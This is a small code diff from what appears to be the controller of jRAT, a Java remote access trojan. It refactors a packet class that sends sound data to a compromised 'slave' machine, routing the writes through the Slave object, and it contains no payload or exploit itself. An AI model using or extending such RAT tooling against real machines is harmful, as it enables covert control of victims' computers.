@@ -2,8 +2,6 @@ package jrat.controller.packets.outgoing;
 
 import jrat.controller.Slave;
 
-import java.io.DataOutputStream;
-
 
 public class Packet83ServerUploadSound extends AbstractOutgoingPacket {
 
@@ -18,10 +16,10 @@ public class Packet83ServerUploadSound extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(Slave slave, DataOutputStream dos) throws Exception {
-		dos.writeInt(quality);
-		dos.writeInt(read);
-		dos.write(data);
+	public void write(Slave slave) throws Exception {
+		slave.writeInt(quality);
+		slave.writeInt(read);
+		slave.write(data);
 	}
 
 	@Override
